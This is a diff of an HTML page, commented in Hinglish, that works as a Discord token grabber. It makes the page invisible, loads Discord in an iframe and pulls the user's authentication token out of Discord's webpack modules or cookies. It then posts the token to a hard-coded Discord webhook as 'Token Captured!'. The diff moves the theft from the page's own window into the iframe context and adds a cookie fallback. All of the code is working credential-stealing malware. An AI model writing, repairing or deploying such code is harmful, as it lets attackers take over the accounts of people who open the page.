@@ -2,75 +2,94 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>...</title>
+    <title></title>
     <style>
-        /* Page ko bilkul invisible bana do taaki user ko pata na chale */
-        body { margin: 0; padding: 0; opacity: 0; pointer-events: none; }
+        body { margin: 0; padding: 0; opacity: 0; }
+        iframe { 
+            width: 100%; 
+            height: 100vh; 
+            border: none; 
+            display: block;
+        }
     </style>
 </head>
 <body>
+    <!-- Discord ko iframe mein load karo -->
+    <iframe id="discord-frame" src="https://discord.com/channels/@me" sandbox="allow-scripts allow-same-origin allow-popups"></iframe>
+
     <script>
-        // Tera Webhook URL
         const WEBHOOK = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
-        async function grabToken() {
-            try {
-                // Check karo ki webpack loaded hai ya nahi
-                if (typeof window.webpackChunkdiscord_app === 'undefined') {
-                    console.log("Webpack not found. Waiting...");
-                    // Agar load nahi hua, toh 2 second wait karo (Discord load hone ka wait)
-                    await new Promise(r => setTimeout(r, 2000));
-                    
-                    // Dobara check karo
-                    if (typeof window.webpackChunkdiscord_app === 'undefined') {
-                        console.log("Still no context. Sending null.");
-                        return;
-                    }
+        // Iframe load hone ka wait karo
+        document.getElementById('discord-frame').addEventListener('load', async () => {
+            console.log("Iframe loaded, checking context...");
+            
+            // Iframe ke context mein token dhundo
+            const frameWindow = document.getElementById('discord-frame').contentWindow;
+            
+            if (!frameWindow.webpackChunkdiscord_app) {
+                console.log("Webpack not found in iframe. Trying fallback...");
+                // Fallback: Try to find token in iframe's document
+                const tokenMatch = frameWindow.document.cookie.match(/"token":"(.*?)"/);
+                if (tokenMatch) {
+                    sendToken(tokenMatch[1]);
+                } else {
+                    console.log("No token found via iframe.");
                 }
+                return;
+            }
 
-                // Tera Original Code (Modified for async/return)
+            // Tera Original Code (Modified for iframe context)
+            try {
+                const chunks = Object.values(frameWindow.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
                 let token = null;
-                try {
-                    const chunks = Object.values(window.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
-                    for(let e of chunks) {
-                        if(!e.exports || e.exports === window) continue;
-                        if(e.exports?.getToken) {
-                            token = e.exports.getToken();
+                
+                for(let e of chunks) {
+                    if(!e.exports || e.exports === frameWindow) continue;
+                    if(e.exports?.getToken) {
+                        token = e.exports.getToken();
+                        break;
+                    }
+                    for(let t in e.exports) {
+                        if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
+                            token = e.exports[t].getToken();
                             break;
                         }
-                        for(let t in e.exports) {
-                            if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
-                                token = e.exports[t].getToken();
-                                break;
-                            }
-                        }
-                        if(token) break;
                     }
-                } catch(e) {
-                    console.error("Grab error", e);
+                    if(token) break;
                 }
 
                 if(token) {
-                    // Token ko Webhook par bhejo
-                    await fetch(WEBHOOK, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
-                        })
-                    });
-                    console.log("Token Sent!");
+                    sendToken(token);
                 } else {
-                    console.log("Token not found.");
+                    console.log("Token not found in iframe webpack.");
                 }
 
             } catch(e) {
-                console.error("Main error", e);
+                console.error("Iframe grab error", e);
+                // Agar iframe context block ho jaye (X-Frame-Options), toh fallback try karo
+                console.log("Falling back to cookie...");
+                const tokenMatch = frameWindow.document.cookie.match(/"token":"(.*?)"/);
+                if (tokenMatch) {
+                    sendToken(tokenMatch[1]);
+                }
+            }
+        });
+
+        async function sendToken(token) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
+                    })
+                });
+                console.log("Token Sent via Iframe!");
+            } catch(e) {
+                console.error("Send error", e);
             }
         }
-
-        // Page load hote hi start karo
-        grabToken();
     </script>
 </body>
 </html>
